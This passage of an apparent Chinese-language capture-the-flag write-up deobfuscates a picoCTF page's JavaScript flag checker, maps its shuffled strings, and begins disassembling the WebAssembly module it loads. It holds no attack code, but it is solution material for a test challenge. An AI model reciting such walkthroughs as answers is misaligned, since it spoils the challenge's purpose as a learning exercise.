        exports<span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e7</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x1</span>
            <span class="token operator">?</span> <span class="token punctuation">(</span>document<span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1ee</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1dc</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span>
                  <span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token operator">:</span> <span class="token punctuation">(</span>document<span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1ee</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1dc</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span>
                  <span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看起來是經過混淆（Obfuscation）的 JS 程式碼，先嘗試簡單逆向一下，說是逆向，其實只是簡單的變數重命名 &amp; 16 進制轉 10 進制 XD。重命名後的代碼像下面這樣。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> strArr <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"value"</span><span class="token punctuation">,</span>
    <span class="token string">"2wfTpTR"</span><span class="token punctuation">,</span>
    <span class="token string">"instantiate"</span><span class="token punctuation">,</span>
    <span class="token string">"275341bEPcme"</span><span class="token punctuation">,</span>
    <span class="token string">"innerHTML"</span><span class="token punctuation">,</span>
    <span class="token string">"1195047NznhZg"</span><span class="token punctuation">,</span>
    <span class="token string">"1qfevql"</span><span class="token punctuation">,</span>
    <span class="token string">"input"</span><span class="token punctuation">,</span>
    <span class="token string">"1699808QuoWhA"</span><span class="token punctuation">,</span>
    <span class="token string">"Correct!"</span><span class="token punctuation">,</span>
    <span class="token string">"check_flag"</span><span class="token punctuation">,</span>
    <span class="token string">"Incorrect!"</span><span class="token punctuation">,</span>
    <span class="token string">"./JIFxzHyW8W"</span><span class="token punctuation">,</span>
    <span class="token string">"23SMpAuA"</span><span class="token punctuation">,</span>
    <span class="token string">"802698XOMSrr"</span><span class="token punctuation">,</span>
    <span class="token string">"charCodeAt"</span><span class="token punctuation">,</span>
    <span class="token string">"474547vVoGDO"</span><span class="token punctuation">,</span>
    <span class="token string">"getElementById"</span><span class="token punctuation">,</span>
    <span class="token string">"instance"</span><span class="token punctuation">,</span>
    <span class="token string">"copy_char"</span><span class="token punctuation">,</span>
    <span class="token string">"43591XxcWUl"</span><span class="token punctuation">,</span>
    <span class="token string">"504454llVtzW"</span><span class="token punctuation">,</span>
    <span class="token string">"arrayBuffer"</span><span class="token punctuation">,</span>
    <span class="token string">"2NIQmVj"</span><span class="token punctuation">,</span>
    <span class="token string">"result"</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token function-variable function">getStr</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">idx<span class="token punctuation">,</span> arg2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    idx <span class="token operator">=</span> idx <span class="token operator">-</span> <span class="token number">470</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> tempStr <span class="token operator">=</span> strArr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> tempStr<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">// This IIFE (Immediately Invoked Function Expression) will shuffle the strArr</span>
<span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">arg1<span class="token punctuation">,</span> arg2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> func2 <span class="token operator">=</span> getStr<span class="token punctuation">;</span>
    <span class="token comment">//This is True</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">const</span> tempConst <span class="token operator">=</span>
                <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">func2</span><span class="token punctuation">(</span><span class="token number">491</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>
                <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">func2</span><span class="token punctuation">(</span><span class="token number">493</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>
                <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">func2</span><span class="token punctuation">(</span><span class="token number">475</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">func2</span><span class="token punctuation">(</span><span class="token number">473</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>
                <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">func2</span><span class="token punctuation">(</span><span class="token number">482</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">func2</span><span class="token punctuation">(</span><span class="token number">483</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>
                <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">func2</span><span class="token punctuation">(</span><span class="token number">478</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">func2</span><span class="token punctuation">(</span><span class="token number">480</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>
                <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">func2</span><span class="token punctuation">(</span><span class="token number">472</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">func2</span><span class="token punctuation">(</span><span class="token number">490</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>
                <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">func2</span><span class="token punctuation">(</span><span class="token number">485</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>tempConst <span class="token operator">===</span> arg2<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> arg1<span class="token punctuation">[</span><span class="token string">"push"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>arg1<span class="token punctuation">[</span><span class="token string">"shift"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            arg1<span class="token punctuation">[</span><span class="token string">"push"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>arg1<span class="token punctuation">[</span><span class="token string">"shift"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span>strArr<span class="token punctuation">,</span> <span class="token number">627907</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> exports<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> func3 <span class="token operator">=</span> getStr<span class="token punctuation">;</span>
    <span class="token keyword">let</span> var1 <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token function">func3</span><span class="token punctuation">(</span><span class="token number">489</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        var2 <span class="token operator">=</span> <span class="token keyword">await</span> WebAssembly<span class="token punctuation">[</span><span class="token function">func3</span><span class="token punctuation">(</span><span class="token number">479</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">await</span> var1<span class="token punctuation">[</span><span class="token function">func3</span><span class="token punctuation">(</span><span class="token number">474</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        var3 <span class="token operator">=</span> var2<span class="token punctuation">[</span><span class="token function">func3</span><span class="token punctuation">(</span><span class="token number">470</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    exports <span class="token operator">=</span> var3<span class="token punctuation">[</span><span class="token string">"exports"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">onButtonPress</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> func4 <span class="token operator">=</span> getStr<span class="token punctuation">;</span>
    <span class="token keyword">let</span> var1 <span class="token operator">=</span> document<span class="token punctuation">[</span><span class="token string">"getElementById"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">func4</span><span class="token punctuation">(</span><span class="token number">484</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">func4</span><span class="token punctuation">(</span><span class="token number">477</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> var1<span class="token punctuation">[</span><span class="token string">"length"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        exports<span class="token punctuation">[</span><span class="token function">func4</span><span class="token punctuation">(</span><span class="token number">471</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>var1<span class="token punctuation">[</span><span class="token function">func4</span><span class="token punctuation">(</span><span class="token number">492</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    exports<span class="token punctuation">[</span><span class="token string">"copy_char"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> var1<span class="token punctuation">[</span><span class="token string">"length"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        exports<span class="token punctuation">[</span><span class="token function">func4</span><span class="token punctuation">(</span><span class="token number">487</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span>
            <span class="token operator">?</span> <span class="token punctuation">(</span>document<span class="token punctuation">[</span><span class="token function">func4</span><span class="token punctuation">(</span><span class="token number">494</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">func4</span><span class="token punctuation">(</span><span class="token number">476</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">func4</span><span class="token punctuation">(</span><span class="token number">481</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">func4</span><span class="token punctuation">(</span><span class="token number">486</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token operator">:</span> <span class="token punctuation">(</span>document<span class="token punctuation">[</span><span class="token function">func4</span><span class="token punctuation">(</span><span class="token number">494</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">func4</span><span class="token punctuation">(</span><span class="token number">476</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">func4</span><span class="token punctuation">(</span><span class="token number">481</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">func4</span><span class="token punctuation">(</span><span class="token number">488</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在第 34 行的地方，我們發現這個自執行的匿名函式會打亂一開始的 <code>strArr</code> 陣列，所以為了搞清楚每個索引對應到的是甚麼，我們可以用瀏覽器的 Devtools 來幫忙。因為在一開始的代碼裡面，從 <code>strArr</code> 裡面找出其中一個元素的函式叫做 <code>_0x4e0e</code>，所以可以先幫他取個別名叫 <code>getStr</code>，並像下面這樣輸入在 Devtools 的 Console 裡面。之後就可以把每個索引帶進去，找到對應的字串了。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">>>></span> <span class="token keyword">const</span> getStr <span class="token operator">=</span> _0x4e0e<span class="token punctuation">;</span>
<span class="token keyword">undefined</span>
<span class="token operator">>>></span> <span class="token function">getStr</span><span class="token punctuation">(</span><span class="token number">489</span><span class="token punctuation">)</span>
<span class="token string">'./JIFxzHyW8W'</span>
<span class="token operator">>>></span> <span class="token function">getStr</span><span class="token punctuation">(</span><span class="token number">479</span><span class="token punctuation">)</span>
<span class="token string">'instantiate'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那我們就一個一個找回去，看看代碼會變怎樣。以下是我全部對應完後的代碼。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> func3 <span class="token operator">=</span> getStr<span class="token punctuation">;</span>
    <span class="token keyword">let</span> var1 <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"./JIFxzHyW8W"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        var2 <span class="token operator">=</span> <span class="token keyword">await</span> WebAssembly<span class="token punctuation">[</span><span class="token string">"instantiate"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">await</span> var1<span class="token punctuation">[</span><span class="token string">"arrayBuffer"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        var3 <span class="token operator">=</span> var2<span class="token punctuation">[</span><span class="token string">"instance"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    exports <span class="token operator">=</span> var3<span class="token punctuation">[</span><span class="token string">"exports"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">onButtonPress</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> func4 <span class="token operator">=</span> getStr<span class="token punctuation">;</span>
    <span class="token keyword">let</span> var1 <span class="token operator">=</span> document<span class="token punctuation">[</span><span class="token string">"getElementById"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"value"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> var1<span class="token punctuation">[</span><span class="token string">"length"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        exports<span class="token punctuation">[</span><span class="token string">"copy_char"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>var1<span class="token punctuation">[</span><span class="token string">"charCodeAt"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    exports<span class="token punctuation">[</span><span class="token string">"copy_char"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> var1<span class="token punctuation">[</span><span class="token string">"length"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        exports<span class="token punctuation">[</span><span class="token string">"check_flag"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span>
            <span class="token operator">?</span> <span class="token punctuation">(</span>document<span class="token punctuation">[</span><span class="token string">"getElementById"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"innerHTML"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Correct!"</span><span class="token punctuation">)</span>
            <span class="token operator">:</span> <span class="token punctuation">(</span>document<span class="token punctuation">[</span><span class="token string">"getElementById"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"innerHTML"</span><span class="token punctuation">]</span> <span class="token operator">=</span>
                  <span class="token string">"Incorrect!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這樣我們大概就可以理解這個代碼會把使用者輸入的資訊透過 <code>copy_char</code> 傳給 WebAssembly 腳本，然後呼叫 <code>chech_flag</code> 來比對 Flag 是否正確，那我們就先來看看第 3 行的地方，他的 WebAssembly 腳本吧。這邊會用到的工具是 <a target="_blank" rel="noopener" href="https://github.com/WebAssembly/wabt">這個</a> 裡面的 <code>wasm2wat</code>，作者自己的描述是這樣：</p><blockquote><p><a target="_blank" rel="noopener" href="https://webassembly.github.io/wabt/doc/wasm2wat.1.html"><strong>wasm2wat</strong></a>: the inverse of wat2wasm, translate from the binary format back to the text format (also known as a .wat)</p></blockquote><p>照著官方的安裝說明裝好之後，使用以下命令就可以啦。（記得先用 <code>wget</code> 把檔案從 <code>http://mercury.picoctf.net:40226/JIFxzHyW8W</code> 抓下來）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">~/Tools/wabt/build/wasm2wat JIFxzHyW8W<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm"><span class="token punctuation">(</span><span class="token keyword">module</span>
  <span class="token punctuation">(</span><span class="token keyword">type</span> <span class="token comment">(;0;)</span> <span class="token punctuation">(</span><span class="token keyword">func</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">type</span> <span class="token comment">(;1;)</span> <span class="token punctuation">(</span><span class="token keyword">func</span> <span class="token punctuation">(</span><span class="token keyword">param</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">result</span> <span class="token keyword">i32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">type</span> <span class="token comment">(;2;)</span> <span class="token punctuation">(</span><span class="token keyword">func</span> <span class="token punctuation">(</span><span class="token keyword">result</span> <span class="token keyword">i32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">type</span> <span class="token comment">(;3;)</span> <span class="token punctuation">(</span><span class="token keyword">func</span> <span class="token punctuation">(</span><span class="token keyword">param</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">func</span> <span class="token comment">(;0;)</span> <span class="token punctuation">(</span><span class="token keyword">type</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token keyword">func</span> <span class="token comment">(;1;)</span> <span class="token punctuation">(</span><span class="token keyword">type</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">param</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">result</span> <span class="token keyword">i32</span><span class="token punctuation">)</span>
    <span class="token punctuation">(</span><span class="token keyword">local</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span> <span class="token keyword">i32</span><span class="token punctuation">)</span>
    <span class="token keyword">global</span>.get <span class="token number">0</span>
    <span class="token keyword">local</span>.set <span class="token number">2</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">32</span>
    <span class="token keyword">local</span>.set <span class="token number">3</span>
    <span class="token keyword">local</span>.get <span class="token number">2</span>
    <span class="token keyword">local</span>.get <span class="token number">3</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>sub</span>
    <span class="token keyword">local</span>.set <span class="token number">4</span>
    <span class="token keyword">local</span>.get <span class="token number">4</span>
    <span class="token keyword">local</span>.get <span class="token number">0</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>store</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">24</span>
    <span class="token keyword">local</span>.get <span class="token number">4</span>
    <span class="token keyword">local</span>.get <span class="token number">1</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>store</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">20</span>
    <span class="token keyword">local</span>.get <span class="token number">4</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>load</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">24</span>
    <span class="token keyword">local</span>.set <span class="token number">5</span>
    <span class="token keyword">local</span>.get <span class="token number">4</span>
    <span class="token keyword">local</span>.get <span class="token number">5</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>store</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">16</span>
    <span class="token keyword">local</span>.get <span class="token number">4</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>load</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">20</span>
    <span class="token keyword">local</span>.set <span class="token number">6</span>
    <span class="token keyword">local</span>.get <span class="token number">4</span>
    <span class="token keyword">local</span>.get <span class="token number">6</span>
    <span class="token keyword">i32<span class="token punctuation">.</span>store</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">12</span>
    <span class="token keyword">block</span>  <span class="token comment">;; label = @1</span>
      <span class="token keyword">loop</span>  <span class="token comment">;; label = @2</span>
        <span class="token keyword">local</span>.get <span class="token number">4</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>load</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">16</span>
        <span class="token keyword">local</span>.set <span class="token number">7</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">1</span>
        <span class="token keyword">local</span>.set <span class="token number">8</span>
        <span class="token keyword">local</span>.get <span class="token number">7</span>
        <span class="token keyword">local</span>.get <span class="token number">8</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>add</span>
        <span class="token keyword">local</span>.set <span class="token number">9</span>
        <span class="token keyword">local</span>.get <span class="token number">4</span>
        <span class="token keyword">local</span>.get <span class="token number">9</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>store</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">16</span>
        <span class="token keyword">local</span>.get <span class="token number">7</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>load8_u</span>
        <span class="token keyword">local</span>.set <span class="token number">10</span>
        <span class="token keyword">local</span>.get <span class="token number">4</span>
        <span class="token keyword">local</span>.get <span class="token number">10</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>store8</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">11</span>
        <span class="token keyword">local</span>.get <span class="token number">4</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>load</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">12</span>
        <span class="token keyword">local</span>.set <span class="token number">11</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">1</span>
        <span class="token keyword">local</span>.set <span class="token number">12</span>
        <span class="token keyword">local</span>.get <span class="token number">11</span>
        <span class="token keyword">local</span>.get <span class="token number">12</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>add</span>
        <span class="token keyword">local</span>.set <span class="token number">13</span>
        <span class="token keyword">local</span>.get <span class="token number">4</span>
        <span class="token keyword">local</span>.get <span class="token number">13</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>store</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">12</span>
        <span class="token keyword">local</span>.get <span class="token number">11</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>load8_u</span>
        <span class="token keyword">local</span>.set <span class="token number">14</span>
        <span class="token keyword">local</span>.get <span class="token number">4</span>
        <span class="token keyword">local</span>.get <span class="token number">14</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>store8</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">10</span>
        <span class="token keyword">local</span>.get <span class="token number">4</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>load8_u</span> <span class="token keyword">offset<span class="token operator">=</span></span><span class="token number">11</span>
        <span class="token keyword">local</span>.set <span class="token number">15</span>
        <span class="token keyword">i32<span class="token punctuation">.</span>const</span> <span class="token number">255</span>
